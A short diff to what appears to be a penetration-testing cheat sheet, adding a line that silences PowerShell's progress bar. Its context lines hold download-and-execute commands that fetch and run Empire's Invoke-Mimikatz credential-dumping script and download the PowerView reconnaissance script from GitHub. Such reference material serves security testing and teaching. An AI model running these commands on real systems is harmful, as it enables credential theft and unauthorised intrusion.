@@ -894,6 +894,7 @@ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com
 (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
 
 # Download a file with PowerShell
+$ProgressPreference = 'SilentlyContinue'
 Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
 
 # Download a file via smbshare
